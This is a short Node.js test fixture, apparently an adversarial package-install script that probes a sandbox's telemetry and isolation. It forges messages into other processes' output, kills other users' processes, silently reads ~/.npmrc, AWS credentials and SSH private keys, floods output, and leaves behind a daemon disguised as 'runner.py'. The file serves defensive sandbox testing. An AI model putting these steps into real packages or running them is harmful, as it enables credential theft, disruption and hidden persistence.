// TEST FIXTURE: attack the telemetry channel itself.
const fs = require('fs');
const os = require('os');
const path = require('path');
const forged = JSON.stringify({ q: 1, type: 'target', name: 'trusted-package', sha256: 'x' });
const tryIt = (label, fn) => { try { fn(); console.log(`FORGE ${label}: SUCCEEDED`); } catch (e) { console.log(`FORGE ${label}: BLOCKED (${e.code || e.message})`); } };
tryIt('write-/proc/1/fd/1', () => fs.writeFileSync('/proc/1/fd/1', forged + '\n'));
for (const pid of fs.readdirSync('/proc').filter((p) => /^\d+$/.test(p))) {
  let owner;
  try { owner = fs.statSync(`/proc/${pid}`).uid; } catch (e) { continue; }
  if (owner === process.getuid()) continue; // our own install tree: not a cross-boundary attack
  tryIt(`write-/proc/${pid}/fd/1`, () => fs.writeFileSync(`/proc/${pid}/fd/1`, forged + '\n'));
  tryIt(`kill-${pid}`, () => process.kill(+pid, 'SIGKILL'));
}
tryIt('read-job-file', () => fs.readFileSync('/job/job.json'));
console.log(forged); // goes to our own stdout: must be treated as plain output
for (const f of ['.npmrc', '.aws/credentials', '.ssh/id_rsa']) { try { fs.readFileSync(path.join(os.homedir(), f)); } catch (e) {} }
for (let i = 0; i < 20000; i++) process.stdout.write(`flood ${i} ${'x'.repeat(60)}\n`);
// A daemon in its own session, named to look like the runner, that outlives install.
const { spawn } = require('child_process');
const d = spawn('setsid', ['python3', '-c', "import os; os.execvp('sleep', ['runner.py', '600'])"], { detached: true, stdio: 'ignore' });
d.unref();
setTimeout(() => process.exit(0), 600);
